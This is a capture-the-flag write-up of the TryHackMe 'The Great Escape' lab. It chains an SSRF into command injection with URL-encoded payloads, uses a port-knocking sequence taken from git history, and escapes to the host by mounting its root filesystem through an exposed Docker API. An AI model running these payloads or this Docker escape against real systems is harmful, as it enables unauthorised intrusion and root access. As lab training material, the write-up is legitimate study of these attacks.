---
title: "The Great Escape : TryHackMe"
last_modified_at: 2021-02-17
categories:
  - TryHackMe
author_profile: false
tags:
  - Docker
  - Port Knocking
  - SSRF
  - Command Injection
  - Chaining
  - TryHackMe
---
Our devs have created an awesome new site. Can you break out of the sandbox?

![/assets/images/TryHackMe/The_Great_Escape/Untitled.png](/assets/images/TryHackMe/The_Great_Escape/Untitled.png)



# Enumeration

First added the IP to hosts file

```<ip> : escape.thm```

## Nmap

```bash
# nmap --min-rate=3000 -sV -sC -o nmap escape.thm
Nmap scan report for escape.thm
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh?
| fingerprint-strings: 
|   GenericLines: 
|_    we_?R&:NPt@HZcir:w<!73
80/tcp open  http    nginx 1.19.6
| http-robots.txt: 3 disallowed entries 
|_/api/ /exif-util /*.bak.txt$
|_http-server-header: nginx/1.19.6
|_http-title: docker-escape-nuxt
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.60%I=7%D=2/15%Time=60298496%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,18,"we_\?R&:NPt@HZcir:w<!73\r\n");
```

The two ports are open 80 and 22

# Port 80

![/assets/images/TryHackMe/The_Great_Escape/Untitled%201.png](/assets/images/TryHackMe/The_Great_Escape/Untitled%201.png)

Since error shows 200 status code so, gobuster didn't work. 

Let's have a look at robots.txt

```bash
User-agent: *
Allow: /
Disallow: /api/
# Disallow: /exif-util
Disallow: /*.bak.txt$
```

/api/

![/assets/images/TryHackMe/The_Great_Escape/Untitled%202.png](/assets/images/TryHackMe/The_Great_Escape/Untitled%202.png)

/exif-util

The upload functionality did not helped much. The `From URL` had a ssrf.

![/assets/images/TryHackMe/The_Great_Escape/Untitled%203.png](/assets/images/TryHackMe/The_Great_Escape/Untitled%203.png)

From URL. 

Port 8080 was found by bruteforcing common ports.

![/assets/images/TryHackMe/The_Great_Escape/Untitled%204.png](/assets/images/TryHackMe/The_Great_Escape/Untitled%204.png)

The url called a new route

![/assets/images/TryHackMe/The_Great_Escape/Untitled%205.png](/assets/images/TryHackMe/The_Great_Escape/Untitled%205.png)

This also did not lead me to any where so not the another entry in the robots file can be used

/*.bak.txt 

I bruteforced the for the well known files and found

`exif-util.bak.txt`

The content of it

```bash
<template>
  <section>
    <div class="container">
      <h1 class="title">Exif Utils</h1>
      <section>
        <form @submit.prevent="submitUrl" name="submitUrl">
          <b-field grouped label="Enter a URL to an image">
            <b-input
              placeholder="http://..."
              expanded
              v-model="url"
            ></b-input>
            <b-button native-type="submit" type="is-dark">
              Submit
            </b-button>
          </b-field>
        </form>
      </section>
      <section v-if="hasResponse">
        <pre>
          {{ response }}
        </pre>
      </section>
    </div>
  </section>
</template>

<script>
export default {
  name: 'Exif Util',
  auth: false,
  data() {
    return {
      hasResponse: false,
      response: '',
      url: '',
    }
  },
  methods: {
    async submitUrl() {
      this.hasResponse = false
      console.log('Submitted URL')
      **try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })**
        this.hasResponse = true
        this.response = response
      } catch (err) {
        console.log(err)
        this.$buefy.notification.open({
          duration: 4000,
          message: 'Something bad happened, please verify that the URL is valid',
          type: 'is-danger',
          position: 'is-top',
          hasIcon: true,
        })
      }
    },
  },
}
</script>
```

Now we found a new host api-dev-backup which should be a docker container. Since this is a development backup I tried different injection techniques. At last found a command injection

```bash
http://escape.thm/api/exif?url=http://api-dev-backup:8080/exif?url=/etc/passwd
```

This showed

```bash
An error occurred: HTTP Exception 400 Bad Request
                Response was:
                ---------------------------------------
                <-- 400 http://api-dev-backup:8080/exif?url=/etc/passwd
Response : Bad Request
Length : 29
Body : Request contains banned words
Headers : (2)
Content-Type : text/plain;charset=UTF-8
Content-Length : 29
```

Banned words which means there must be some filter going on

Let's try other commands

```bash
http://escape.thm/api/exif?url=http://api-dev-backup:8080/exif?url=echo%20%3Cfdasfa
```

```bash
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               sh: 1: cannot open fdasfa: No such file
```

Which means something is running. fdasfa should be a file name . Lets try other payloads

```bash
http://escape.thm/api/exif?url=http://api-dev-backup:8080/exif?url=echo%20%3Cfdasfa;ls%20-la
```

This worked

```bash
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               sh: 1: cannot open fdasfa: No such file
total 49260
drwxr-xr-x 1 root root     4096 Jan  7 17:42 .
drwxr-xr-x 1 root root     4096 Jan  7 22:14 ..
-rwxr-xr-x 1 root root 50433552 Jan  7 16:46 application
```

I am just writing the commands I ran. 

I tried getting reverse shell, but could not so I enumerated the box manually. In the /root directory found that it is a git repository.

```bash
ls -la /root
```

```bash
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               sh: 1: cannot open fdasfa: No such file
total 28
drwx------ 1 root root 4096 Jan  7 16:48 .
drwxr-xr-x 1 root root 4096 Jan  7 22:14 ..
lrwxrwxrwx 1 root root    9 Jan  6 20:51 .bash_history -> /dev/null
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 1 root root 4096 Jan  7 16:48 .git
-rw-r--r-- 1 root root   53 Jan  6 20:51 .gitconfig
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-rw-r-- 1 root root  201 Jan  7 16:46 dev-note.txt
```

### Git Lo

Since we were not in the directory where there was the git repo so used —git-dir 

```bash
git --git-dir /root/.git log
```

```bash
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               sh: 1: cannot open fdasfa: No such file
commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
Author: Hydra <hydragyrum@example.com>
Date:   Thu Jan 7 16:48:58 2021 +0000

    fixed the dev note

commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Removed the flag and original dev note b/c Security

commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes
```

### Git diff

Let's view changes in the oldest commit

```bash
git --git-dir /root/.git diff a3d30a7d0510dc6565ff9316e3fb84434916dee8
```

```bash
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               sh: 1: cannot open fdasfa: No such file
diff --git a/dev-note.txt b/dev-note.txt
index 89dcd01..efadf5b 100644
--- a/dev-note.txt
+++ b/dev-note.txt
@@ -1,8 +1,8 @@
 Hey guys,
 
-I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
+Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.
 
-Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+Anyways, the password is fluffybunnies123
 
 Cheers,
 
diff --git a/flag.txt b/flag.txt
deleted file mode 100644
index aae8129..0000000
--- a/flag.txt
+++ /dev/null
@@ -1,3 +0,0 @@
-You found the root flag, or did you?
-
-THM{0cb**********************876}
\ No newline at end of file
```

### Port knocking

So we need to knock some port's let's do that using netcat

```bash
nc escape.thm 42
nc escape.thm 1337
nc escape.thm 10420
nc escape.thm 6969
nc escape.thm 63000
```

### Open Ports after port knocking

Let's check which port is now open

```bash
Starting Nmap 7.60 ( https://nmap.org ) at 2021-02-15 22:24 +0545
Nmap scan report for escape.thm 
Host is up (0.17s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
2375/tcp  open     docker
4153/tcp  filtered mbl-battd
19344/tcp filtered unknown
```

So we have a docker port. Let's enumerate for the images

```bash
# docker -H escape.thm images
REPOSITORY                                    TAG                 IMAGE ID            CREATED             SIZE
exif-api-dev                                  latest              4084cb55e1c7        5 weeks ago         214MB
exif-api                                      latest              923c5821b907        5 weeks ago         163MB
frontend                                      latest              577f9da1362e        5 weeks ago         138MB
endlessh                                      latest              7bde5182dc5e        5 weeks ago         5.67MB
nginx                                         latest              ae2feff98a0c        2 months ago        133MB
debian                                        10-slim             4a9cd57610d6        2 months ago        69.2MB
registry.access.redhat.com/ubi8/ubi-minimal   8.3                 7331d26c1fdf        2 months ago        103MB
alpine                                        3.9                 78a2ce922f86        9 months ago        5.55MB
```

So we have a few images, let's try exploiting this to mount the host machine's files to a new container

### Using Nginx Image to mount host filesystem into container

```bash
# docker -H escape.thm:2375 run -v /:/mnt --rm -it nginx chroot /mnt sh

-H for remote host <host>:<port> (escape.thm:2375)
-v Mounting volume /:/mnt ( Mount / of host to /mnt of the container )
--rm remove the container after user exits the container
-it for interactive mode
chroot /mnt to change root directory to /mnt
sh to run shell
```

Now I have a shell to a container which has host machine file system mounted

```bash
root@8162b080afbc:~# ls -la /root/flag.txt
-rw------- 1 root root 74 Jan  6 23:37 /root/flag.txt
```

Finally got the root flag.

```bash
root@8162b080afbc:~# cat flag.txt
Congrats, you found the real flag!

THM{c62**********************d734}
```

### Getting First Flag

Now we need to find the first flag, which is in the web app.

First let's enumerate the running containers

```bash
root@8162b080afbc:~# docker container ls
CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS          PORTS                  NAMES
8162b080afbc   nginx          "/docker-entrypoint.…"   5 minutes ago   Up 5 minutes    80/tcp                 fervent_mccarthy
49fe455a9681   frontend       "/docker-entrypoint.…"   5 weeks ago     Up 37 minutes   0.0.0.0:80->80/tcp     dockerescapecompose_frontend_1
4b51f5742aad   exif-api-dev   "./application -Dqua…"   5 weeks ago     Up 37 minutes                          dockerescapecompose_api-dev-backup_1
cb83912607b9   exif-api       "./application -Dqua…"   5 weeks ago     Up 37 minutes   8080/tcp               dockerescapecompose_api_1
548b701caa56   endlessh       "/endlessh -v"           5 weeks ago     Up 37 minutes   0.0.0.0:22->2222/tcp   dockerescapecompose_endlessh_1
```

Since the docker file or docker-compose is normally used to create docker containers, let's find them. After enumerating the host machine the home directory had juicy stuffs

```bash
root@8162b080afbc:/home/hydra# ls
docker-escape-compose  endlessh
```

First let's check docker-escape-compose

```bash
root@8162b080afbc:/home/hydra/docker-escape-compose# ls -la
total 32
drwxrwxr-x 5 hydra hydra 4096 Jan  7 23:12 .
drwxr-xr-x 8 hydra hydra 4096 Jan  7 23:13 ..
drwxrwxr-x 2 hydra hydra 4096 Jan  7 17:46 api
drwxrwxr-x 2 hydra hydra 4096 Jan  7 18:53 api-dev
-rw-rw-r-- 1 hydra hydra   63 Jan  6 19:42 docker-compose.dev.yaml
-rw-rw-r-- 1 hydra hydra   61 Jan  6 19:42 docker-compose.override.yaml
-rw-rw-r-- 1 hydra hydra  575 Jan  7 17:48 docker-compose.yaml
drwxrwxr-x 4 hydra hydra 4096 Jan  6 19:42 front
```

After enumerating I found the flag on the front directory, which was for the frontend of the application

```bash
root@8162b080afbc:/home/hydra/docker-escape-compose/front# ls -la
total 20
drwxrwxr-x 4 hydra hydra 4096 Jan  6 19:42 .
drwxrwxr-x 5 hydra hydra 4096 Jan  7 23:12 ..
-rw-rw-r-- 1 hydra hydra   98 Jan  6 19:42 Dockerfile
drwxrwxr-x 8 hydra hydra 4096 Jan  7 17:46 dist
drwxrwxr-x 2 hydra hydra 4096 Jan  6 19:42 nginx
```

Let's view the DockerFile

```bash
root@8162b080afbc:/home/hydra/docker-escape-compose/front# cat Dockerfile 
FROM nginx

COPY ./nginx/nginx.conf /etc/nginx/conf.d/default.conf
COPY dist /usr/share/nginx/html
```

nginx.conf is the nginx configuration so I didn't bother checking it. Since it copies the `dist` directory, so let's have a look at it

```bash
root@8162b080afbc:/home/hydra/docker-escape-compose/front/dist# ls -la
total 260
drwxrwxr-x 8 hydra hydra  4096 Jan  7 17:46 .
drwxrwxr-x 4 hydra hydra  4096 Jan  6 19:42 ..
-rw-rw-r-- 1 hydra hydra     0 Jan  6 19:42 .nojekyll
drwxrwxr-x 2 hydra hydra  4096 Jan  6 19:42 .well-known
-rw-rw-r-- 1 hydra hydra  3834 Jan  6 19:42 200.html
-rw-rw-r-- 1 hydra hydra   435 Jan  6 19:42 README.md
drwxrwxr-x 4 hydra hydra  4096 Jan  6 19:42 _nuxt
drwxrwxr-x 2 hydra hydra  4096 Jan  6 19:42 admin
-rw-rw-r-- 1 hydra hydra  8139 Jan  6 19:42 android-icon-144x144.png
-rw-rw-r-- 1 hydra hydra  9125 Jan  6 19:42 android-icon-192x192.png
-rw-rw-r-- 1 hydra hydra  2329 Jan  6 19:42 android-icon-36x36.png
-rw-rw-r-- 1 hydra hydra  2645 Jan  6 19:42 android-icon-48x48.png
-rw-rw-r-- 1 hydra hydra  3753 Jan  6 19:42 android-icon-72x72.png
-rw-rw-r-- 1 hydra hydra  5049 Jan  6 19:42 android-icon-96x96.png
-rw-rw-r-- 1 hydra hydra  6042 Jan  6 19:42 apple-icon-114x114.png
-rw-rw-r-- 1 hydra hydra  6483 Jan  6 19:42 apple-icon-120x120.png
-rw-rw-r-- 1 hydra hydra  8139 Jan  6 19:42 apple-icon-144x144.png
-rw-rw-r-- 1 hydra hydra  8790 Jan  6 19:42 apple-icon-152x152.png
-rw-rw-r-- 1 hydra hydra 11228 Jan  6 19:42 apple-icon-180x180.png
-rw-rw-r-- 1 hydra hydra  3070 Jan  6 19:42 apple-icon-57x57.png
-rw-rw-r-- 1 hydra hydra  3127 Jan  6 19:42 apple-icon-60x60.png
-rw-rw-r-- 1 hydra hydra  3753 Jan  6 19:42 apple-icon-72x72.png
-rw-rw-r-- 1 hydra hydra  3980 Jan  6 19:42 apple-icon-76x76.png
-rw-rw-r-- 1 hydra hydra  9699 Jan  6 19:42 apple-icon-precomposed.png
-rw-rw-r-- 1 hydra hydra  9699 Jan  6 19:42 apple-icon.png
-rw-rw-r-- 1 hydra hydra   281 Jan  6 19:42 browserconfig.xml
drwxrwxr-x 2 hydra hydra  4096 Jan  6 19:42 courses
drwxrwxr-x 2 hydra hydra  4096 Jan  6 19:42 exif-util
-rw-rw-r-- 1 hydra hydra  1479 Jan  6 19:42 exif-util.bak.txt
-rw-rw-r-- 1 hydra hydra  1383 Jan  6 19:42 favicon-16x16.png
-rw-rw-r-- 1 hydra hydra  2159 Jan  6 19:42 favicon-32x32.png
-rw-rw-r-- 1 hydra hydra  5049 Jan  6 19:42 favicon-96x96.png
-rw-rw-r-- 1 hydra hydra  1150 Jan  6 19:42 favicon.ico
-rw-rw-r-- 1 hydra hydra  3834 Jan  6 19:42 index.html
drwxrwxr-x 2 hydra hydra  4096 Jan  6 19:42 login
-rw-rw-r-- 1 hydra hydra   720 Jan  6 19:42 manifest.json
-rw-rw-r-- 1 hydra hydra  8139 Jan  6 19:42 ms-icon-144x144.png
-rw-rw-r-- 1 hydra hydra  8659 Jan  6 19:42 ms-icon-150x150.png
-rw-rw-r-- 1 hydra hydra 27427 Jan  6 19:42 ms-icon-310x310.png
-rw-rw-r-- 1 hydra hydra  3756 Jan  6 19:42 ms-icon-70x70.png
-rw-rw-r-- 1 hydra hydra    84 Jan  7 17:46 robots.txt
```

What caught my eyes was `.well-known` as the hint said

![/assets/images/TryHackMe/The_Great_Escape/Untitled%206.png](/assets/images/TryHackMe/The_Great_Escape/Untitled%206.png)

While enumerating the web application, I thought this was the robots.txt file.

Let's have a look at the `.well-known` file

```bash
root@8162b080afbc:/home/hydra/docker-escape-compose/front/dist# ls -la .well-known/
total 12
drwxrwxr-x 2 hydra hydra 4096 Jan  6 19:42 .
drwxrwxr-x 8 hydra hydra 4096 Jan  7 17:46 ..
-rw-rw-r-- 1 hydra hydra  251 Jan  6 19:42 security.txt
```

```bash
root@8162b080afbc:/home/hydra/docker-escape-compose/front/dist/.well-known# cat security.txt 
Hey you found me!

The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.

See https://securitytxt.org/ for more information.

Ping **/api/fl46** with a HEAD request for a nifty treat.
```

So it says the final flag is in the /api/fl46 route and test with head request. Let's use curl to get the flag

```bash
curl -X HEAD http://escape.thm/api/fl46 -v
> HEAD /api/fl46 HTTP/1.1
> Host: escape.thm
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.19.6
< Date: Mon, 15 Feb 2021 17:02:20 GMT
< Connection: keep-alive
< flag: THM{b801********************5ad4}

```

With this, I was able to find all the flag.

I tried to view the vulnerable code but it was a binary. I tried reverse engineering the binary but I was not able to understand it.

Overall I loved the box. This does not have much brute-forcing. Enumerations played a large part to get the flags. Once I figured out the SSRF to RCE chain, the docker part was a piece of cake. Kudos to the creator for this awesome box.